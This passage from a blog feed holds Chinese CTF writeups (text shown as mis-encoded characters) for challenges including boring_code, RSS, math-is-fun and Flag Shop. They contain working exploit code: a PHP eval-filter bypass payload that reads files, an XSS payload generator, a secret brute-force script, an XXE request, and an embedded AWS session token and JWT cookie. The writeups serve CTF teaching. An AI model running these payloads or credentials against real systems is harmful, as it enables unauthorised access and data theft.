class="line">AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEIP//////////wEaDmFwLW5vcnRoZWFzdC0xIkYwRAIgUSeA5K2lfCSiSffkkkEI1K/UBr3ujuppACfia/nUalkCIB30VBYpXi/F+vsDuJQzdEX0TQuq2ukNArDLkIthFaOrKokCCLz//////////wEQABoMODk4ODI5NjM2NzYyIgz3SiwxjDyJfOaEcpEq3QE3r5fc6BCD7NBqaP47fjvrlIfN6+2nJ2OL87H5HXAfoDYmubETgltb4Pald7QjvWuXhaTLO1pc7EXHb3kM5gVnkbHLfeA3VVzmLfovKNHbkdQEsXBrTuBkNkyzLzZ/IT7o4oKliK5pQ9AtlwtjUAwMDjd0EHErkAocE3nZccgFk33XCJSYELNtyE9b8wMc/OazJJ6F1Ls3hooH32SUoTpEKf/LJGDK5y5GOxdKT59nDBEGJ87xWmciQZJHIRo+uLOabvlA693RBGPz9LnEASb4+4NAIVyxUDTamNb3qTC6i7joBTq1AVZTquczQh4EvFY/P+fL03/aOq21IbAQFttGqmVwrDJNc3W8E/B6cmvaIuR0xmsfHb+/bhncSXc1VjQsPv1ZiJv16P9gCpf9Y6Xnbp7nmy7yVIvmUnK3WZJgOXS/Amsu/kUbxJT4WxR4d4r3xz1UGqmZfw+0MwDkcxtLMvMSVG5FkwvjP5W0JFG41Tp+wLfSRmN992Fa++PA0RGC55tyh9sbot8aGhnniFHXPoTq45xuMgLyzfc=</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/14/MFto5zXEjc4Zg1p.png" alt="2F725AD4-4498-462D-A130-4DB4C0EC6946.png"></p><p>æ­¤å¤„tokenéå¸¸é‡è¦ï¼Œä¸€å®šè¦å†™è¿›é…ç½®æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /root/.aws/credentials</span><br></pre></td></tr></table></figure></p><p>ä¹‹åä¸‹è½½flagå³å¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 cp s3://static.l0ca1.xyz/flaaaaaaaaag/flaaaag.txt ./flag.txt --region ap-northeast-1</span><br></pre></td></tr></table></figure></p><h2 id="0x02-math-is-fun1"><a href="#0x02-math-is-fun1" class="headerlink" title="0x02 math-is-fun1"></a>0x02 math-is-fun1</h2><p>è§£é¢˜æ€è·¯ï¼ˆmath-is-fun2 ä¹Ÿæ˜¯è¿™ä¸ªpayloadï¼Œä¸€æ‰“å°±é€šï¼‰<br>é€šè¿‡2æ¥ä¿®æ”¹MathJaxçš„é…ç½®ï¼Œä»è€ŒåŠ è½½ä»»æ„jsæ–‡ä»¶ï¼Œæ­¤æ—¶å¼•å…¥jsonpæ¥å®ç°xssã€‚</p><p><img src="https://i.loli.net/2019/09/14/w2Uh8JB7SeusMDP.png" alt="A55D141E-1300-4393-BBFE-B0876EABDA65.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span><span class="params">(evaljs)</span>:</span></span><br><span class="line">p = <span class="string">"http://47.110.128.101/config?callback="</span></span><br><span class="line">payload=<span class="string">'eval(String.fromCharCode('</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(evaljs)):</span><br><span class="line">payload+=str(ord(evaljs[i]))</span><br><span class="line"><span class="keyword">if</span>(i+<span class="number">1</span>&lt;len(evaljs)):</span><br><span class="line">payload+=<span class="string">','</span></span><br><span class="line">payload+=<span class="string">'));//'</span></span><br><span class="line">payload+=<span class="string">""</span></span><br><span class="line">test = <span class="string">"http://47.110.128.101/challenge?name=abcd%0aMathJax[%27root%27]%3d"</span></span><br><span class="line">payload = test+p+payload+<span class="string">"%26/"</span></span><br><span class="line">print(<span class="string">"[payload] "</span>+payload)</span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">arg = sys.argv[<span class="number">2</span>]</span><br><span class="line">getPayload(arg)</span><br></pre></td></tr></table></figure><h2 id="0x03-Flag-Shop"><a href="#0x03-Flag-Shop" class="headerlink" title="0x03 Flag Shop"></a>0x03 Flag Shop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://47.110.15.101/work?name=%3C%25%3d$%26%25%3E&amp;do=%3C%25%3d$%26%25%3E+is+working&amp;SECRET=&#123;SECRET&#125;&quot;</span><br><span class="line"></span><br><span class="line">SECRET =&quot;ec55ce17b51f7f2588b3d2f09c821e6499984b09810e652ce9fa4882fe4875c8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">&quot;Cookie&quot;: &quot;auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJhMDc4ZDU3ZC0wZjZmLTRhNTItODE1MC0yMGYyOTkzYzkxMTUiLCJqa2wiOjI4fQ.gQnZDaa3pKpldiD07vWsX65SO4Ioz5ZawOy5xJPNSEU;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">zidian=&quot;1234567890qwertyuiopasdfghjklzxcvbnm&quot;</span><br><span class="line">for jj in range(30):</span><br><span class="line">for i in zidian:</span><br><span class="line">test = SECRET + i</span><br><span class="line"># test = i + SECRET</span><br><span class="line">crackUrl = url.replace(&quot;&#123;SECRET&#125;&quot;,test)</span><br><span class="line">text = requests.get(crackUrl,headers=headers).text</span><br><span class="line">if(&quot;&apos;&quot;+test+&quot; &quot; in text):</span><br><span class="line">SECRET = test</span><br><span class="line">print(&quot;[SECRET] &quot; + SECRET)</span><br><span class="line">break</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;åšé¢˜æœ€å¤šï¼Œä½†æ˜¯wpæœ€ç®€ç•¥å’Œä¸å…¨çš„ä¸€æ¬¡ï¼Œ:)&lt;/p&gt;
&lt;h2 id=&quot;0x01-easy-php&quot;&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019 bytectf writeup</title>
    <link href="http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/"/>
    <id>http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/</id>
    <published>2019-09-14T15:21:58.000Z</published>
    <updated>2019-09-14T15:28:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å‘¨æœ«çš„æ¯”èµ›è´¨é‡è¿˜æ˜¯æŒºé«˜çš„ï¼Œç‰¹åˆ«æ˜¯boring_codeï¼Œæœ‰ç‚¹çƒ§è„‘ä½†æ˜¯åšçš„å°±å¾ˆå¼€å¿ƒã€‚</p><p>æ–‡ç« é¦–å‘åˆå¤©å®éªŒå®¤ï¼Œè½¬è½½è¯·æ³¨æ„ç‰ˆæƒã€‚</p><h2 id="0x01-boring-code"><a href="#0x01-boring-code" class="headerlink" title="0x01 boring_code"></a>0x01 boring_code</h2><h4 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p><a href="http://112.125.25.2:9999" target="_blank" rel="noopener">http://112.125.25.2:9999</a></p><h4 id="é¢˜ç›®è§£ç­”"><a href="#é¢˜ç›®è§£ç­”" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>é¢˜ç›®ä¸Šæ¥çš„é‚®ä»¶æºç ä¸­ç»™äº†æç¤ºï¼Œæ‰€ç›´æ¥åˆ†æç›®å½•å¾—åˆ°äº†å¯¹åº”çš„ç¨‹åºæºç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Â <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">$url = $_POST[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">$r = parse_url($url);</span><br><span class="line">print_r($r);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"pass preg_match"</span>;</span><br><span class="line">$code = file_get_contents($url);</span><br><span class="line">print_r($code);</span><br><span class="line"><span class="comment">// ä¸‹é¢è¿™ä¸ªæ­£åˆ™çº¦æŸäº†åªèƒ½æ˜¯phpinfo();è¿™æ ·çš„å½¢å¼</span></span><br><span class="line"><span class="comment">// æ‰€ä»¥åŸºæœ¬æ¥è¯´ php://input æ˜¯ä¸è¡Œäº†</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªé¢˜ç›®åŸºæœ¬æ˜¯ä»¥<code>file_get_contents</code>å‡½æ•°ä¸ºç•Œé™åˆ†ä¸ºäº†ä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><ol><li>éœ€è¦bypass <code>filter_var</code> ã€ <code>parse_url</code>  å’Œ <code>preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])</code>  è¿™ä¸‰ä¸ªå‡½æ•°çš„é™åˆ¶ï¼›</li><li>éœ€è¦bypass åœ¨<code>eval</code>å‡½æ•°ä¹‹å‰çš„é‚£ä¸€å †æ­£åˆ™é™åˆ¶</li></ol><p>é¦–å…ˆé’ˆå¯¹ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼Œæˆ‘æ‰€çŸ¥çš„æœ‰ä¸‰ç§è§£å†³æ–¹æ¡ˆ:</p><ol><li>è´­ä¹°ä¸€ä¸ªå«æœ‰baidu.comå­—ç¬¦çš„åŸŸåï¼Œæ¯”å¦‚<code>z3r0yu.bytebaidu.com</code> ï¼ˆåˆšå¼€å§‹bypasså¤ªå›°éš¾ï¼Œ5am3å¸ˆå‚…å’¬äº†å’¬ç‰™ç›´æ¥å°±ä¹°äº†ï¼Œæ°ªé‡‘è§£å†³ä¸€åˆ‡å•Šï¼‰</li><li>ä½¿ç”¨ftpåè®®ï¼Œ<code>ftp://ip:port,baidu.com:80/filename.txt</code></li><li>ä½¿ç”¨ä¸€ä¸ªç™¾åº¦çš„ä»»æ„è·³è½¬çš„æ¼æ´ï¼ˆè¿˜çœŸæœ‰ï¼‰<code>post.baidu.com</code> ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ <a href="https://www.4xseo.com/marketing/1280/#title-0" target="_blank" rel="noopener">é“¾æ¥</a></li></ol><p>ç¬¬ä¸€éƒ¨åˆ†è¿‡äº†ä¹‹åå°±éœ€è¦bypasså¯¹shellçš„é™åˆ¶äº†ï¼Œå› ä¸ºæ­¤å¤„é™åˆ¶çš„æ¯”è¾ƒæ­»ï¼Œæ‰€ä»¥ä¹‹å‰çš„é‚£äº›æ‰§è¡Œæ–¹å¼å°±ç»Ÿç»Ÿå¤±æ•ˆäº†</p><p>é¦–å…ˆå…ˆæ„æ€ä¸€ä¸ªç®€å•çš„payloadï¼Œå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(&apos;.&apos;))));</span><br></pre></td></tr></table></figure></p><p>å› ä¸º <code>.</code> å¯¹åº”çš„æ˜¯ chr(46)ï¼Œæ‰€ä»¥payloadå°±å¯ä»¥æ˜¯å¦‚ä¸‹çš„å½¢å¼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(46)))));</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯æ­£åˆ™è¡¨è¾¾å¼é™åˆ¶äº†ä¸èƒ½å¤Ÿåœ¨å‡½æ•°ä¸­ä½¿ç”¨å‚æ•°ï¼Œæ‰€ä»¥ä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹çœ‹ç³»ç»Ÿä¸­è¿˜å‰©ä»€ä¹ˆå‡½æ•°å¯ä»¥ä½¿ç”¨</p><p>å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼æ¥è¿›è¡Œåˆæ­¥fuzz</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">var_dump(gettype(get_defined_functions()));</span><br><span class="line">var_dump(count(get_defined_functions()[internal]));</span><br><span class="line"><span class="comment">//Â var_dump(preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i',Â '111'));</span></span><br><span class="line"></span><br><span class="line">$i_need_func=<span class="keyword">array</span>();</span><br><span class="line">$j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>Â ($i=<span class="number">0</span>;Â $iÂ &lt;Â count(get_defined_functions()[internal])Â ;Â $i++)Â &#123;Â </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>Â (!preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|xdebug|prvd|_|-/i'</span>,Â get_defined_functions()[internal][$i]))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $i_need_func[$j]=get_defined_functions()[internal][$i];</span><br><span class="line">Â Â Â Â Â Â Â Â $j++;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($i_need_func);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åŸºæœ¬ä½¿ç”¨å‡½æ•°æ¥è·å–å¤–éƒ¨å¯¼å…¥å˜é‡æ˜¯ä¸å¯èƒ½çš„äº†ï¼Œä½†æ˜¯å…³æ³¨åˆ°ä¸€ä¸ªå‡½æ•° <code>phpversion()</code> å¯ä»¥è¿”å›å¯¹åº”çš„phpç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯ 7 è¿™ä¸ªæ•°å­—</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æ•°å­¦é¢˜äº†ï¼Œå¦‚ä½•åˆ©ç”¨å‰©ä¸‹çš„æ•°å­¦å‡½æ•°æ¥æ„é€ å‡ºæ•°å­— 46 , æœ€ç»ˆåˆ©ç”¨å¦‚ä¸‹æ–¹å¼æ„é€ å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))));</span><br></pre></td></tr></table></figure><p>ä»è€Œå¾—åˆ°äº† <code>.</code></p><p>PS: éšåä¹Ÿfuzzå‡º <code>localeconv()</code> å‡½æ•°çš„è¿”å›å€¼ä¸­æœ‰ä¸€ä¸ª <code>.</code> (fuzzè„šæœ¬é™„åœ¨æœ€å)</p><p>æ‰€ä»¥æ­¤æ—¶å·²ç»å¯ä»¥å¯ä»¥å®Œæˆå¯¹å½“å‰ç›®å½•æ–‡ä»¶çš„è¯»å–ï¼Œä½†æ˜¯é¢˜ç›®æç¤ºæ–‡ä»¶æ˜¯åœ¨ä¸Šä¸€å±‚ç›®å½•ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ„é€  <code>..</code> æ¥è·³åˆ°ä¸Šä¸€çº§ç›®å½•ï¼Œæ­¤å¤„åˆšå¼€å§‹ä¹Ÿå¡äº†å¥½ä¹…ï¼Œä½†éšåçªç„¶æƒ³åˆ° <code>ls -a</code> ä¹‹åç³»ç»Ÿä¸å°±è‡ªå¸¦ä¸¤ç‚¹ï¼Œè¿™ä¸æ˜¯ç³»ç»Ÿç‰¹æ€§å˜›ï¼Œæ‰€ä»¥å°±æœ‰äº†å¦‚ä¸‹paylaod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/14/fnAD8hJCj4UQeMN.png" alt="2E4F324A-D809-4F3C-8168-0829EDF82DF6.png"></p><p>ä¹‹åå°±æ˜¯ä½¿ç”¨<code>chr</code>å‡½æ•°è¿›è¡Œè·³åˆ°ä¸Šä¸€çº§ç›®å½•ï¼Œä½†æ˜¯è·³å®Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¯¥æ€ä¹ˆå†æ¬¡è·å–ä¸€ä¸ª<code>.</code>å‡ºæ¥ï¼Œ<code>chr</code>å‡½æ•°çš„è¿”å›å€¼æ˜¯å¸ƒå°”å€¼ï¼Œé‚£ä¹ˆä¹‹åå°±å°†å¸ƒå°”å€¼Trueä½œä¸ºå‚æ•°æ”¾åœ¨fuzzerä¸­çœ‹èƒ½å¾—åˆ°ä»€ä¹ˆç»“æœï¼Œæœ€åfuzzè½®æ¬¡ä¸ä¸€æ ·æ—¶å‘ç° <code>time</code> å‡½æ•°è¿”å›çš„ç»“æœä¹Ÿä¸ä¸€æ ·ï¼ŒéšåæŸ¥äº†ä¸€ä¸‹æ‰‹å†Œï¼Œä¾¿æ„è¯†åˆ°å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼æ¥è¿›è¡Œæ„é€ ä¸€ä¸ª46å‡ºæ¥ï¼Œæ‰€ä»¥æ„é€ å‡ºå¦‚ä¸‹payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localtime(time(1))</span><br></pre></td></tr></table></figure><p>ç»¼ä¸Šå°±å¯ä»¥æ„é€ å‡ºpayloadå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br></pre></td></tr></table></figure></p><p>å¦ä¸€ç§payloadå¯ä»¥æ„é€ å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥è¿™é¢˜å†é™åˆ¶ä¸€ä¸‹é•¿åº¦ä¼°è®¡ä¼šæ›´éš¾</p><p>æˆ‘åœ¨è§£é¢˜æ—¶ä½¿ç”¨çš„ç²—ç³™fuzzer<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(gettype(get_defined_functions()));</span><br><span class="line">var_dump(count(get_defined_functions()[internal]));</span><br><span class="line"><span class="comment">// var_dump(preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', '111'));</span></span><br><span class="line"></span><br><span class="line">$i_need_func=<span class="keyword">array</span>();</span><br><span class="line">$j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; count(get_defined_functions()[internal]) ; $i++) &#123; </span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|xdebug|prvd|_/i'</span>, get_defined_functions()[internal][$i])) &#123;</span><br><span class="line">        $i_need_func[$j]=get_defined_functions()[internal][$i];</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print_r($i_need_func);</span></span><br><span class="line"><span class="comment">// $res=array();</span></span><br><span class="line"><span class="comment">// $t=0;</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; count($i_need_func); $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span>(!is_null($i_need_func[$i]()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $i_need_func[$i];</span><br><span class="line">            var_dump($i_need_func[$i]());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if (var_dump(print_r($i_need_func[$i](chr(46))))) &#123;</span></span><br><span class="line">        <span class="comment">//     echo $i_need_func[$i];</span></span><br><span class="line">        <span class="comment">//     $res[$t]=$i_need_func[$i];</span></span><br><span class="line">        <span class="comment">//     $t++;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (\Throwable $th) &#123;</span><br><span class="line">    <span class="comment">//throw $th;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print_r($res);</span></span><br></pre></td></tr></table></figure></p><p>æœ€åå†ç®€è¦æä¸€ä¸‹æˆ‘çœ‹åˆ°çš„å¦å¤–ä¸¤ç§payload</p><p>ä¸¤ä¸­payloadéƒ½æ˜¯åˆ©ç”¨äº†hashçš„ç‰¹å¾</p><p>paylaod1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</span><br></pre></td></tr></table></figure></p><p>åŸç†ï¼šhebrevc(crypt(arg))å¯ä»¥éšæœºç”Ÿæˆä¸€ä¸ªhashå€¼ ç¬¬ä¸€ä¸ªå­—ç¬¦éšæœºæ˜¯ $(å¤§æ¦‚ç‡) æˆ–è€… .(å°æ¦‚ç‡) ç„¶åé€šè¿‡ord chråªå–ç¬¬ä¸€ä¸ªå­—ç¬¦</p><p><img src="https://i.loli.net/2019/09/14/qXTpclsheSrxAUN.png" alt="D4BB0F3D-0D73-41EC-A68C-F5374EA53376.png"></p><p>payload2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br></pre></td></tr></table></figure></p><p>åŸç†ï¼šcrypt(serialize(array())) åŸå› åŒä¸Š</p><p><img src="https://i.loli.net/2019/09/14/AviDaUmQtSrYs4I.png" alt="2C65B93D-2D28-4C12-8E88-ADF9C90C5DF6.png"></p><p>PS: è¿™ç§ä¹Ÿå¯ä»¥åˆ©ç”¨fuzzerå‘ç°ï¼Œå°±åƒå‘ç°timeå‡½æ•°é‚£æ ·ï¼Œæ£€æµ‹è½®æ¬¡ä¸­ç»“æœçš„å˜åŒ–å³å¯</p><h2 id="0x02-RSS"><a href="#0x02-RSS" class="headerlink" title="0x02 RSS"></a>0x02 RSS</h2><h4 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p><a href="http://112.126.96.50:9999" target="_blank" rel="noopener">http://112.126.96.50:9999</a></p><h4 id="é¢˜ç›®è§£ç­”-1"><a href="#é¢˜ç›®è§£ç­”-1" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>è¿™é¢˜åŸºæœ¬æ˜¯ä¸ªåŸé¢˜ï¼Œåªæ˜¯ <code>create_function</code> çš„ä½ç½®æ”¹å˜äº†ï¼Œä»»æ„æ–‡ä»¶è¯»å–æ”¹æˆäº†xxeæ¥å®Œæˆï¼ŒåŸŸåé™åˆ¶çš„çªç ´ä¹Ÿå¯ä»¥ä½¿ç”¨è´­ä¹°åŸŸåæ¥å®ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /fetch HTTP/1.1</span><br><span class="line">Host: 112.126.96.50:9999</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: 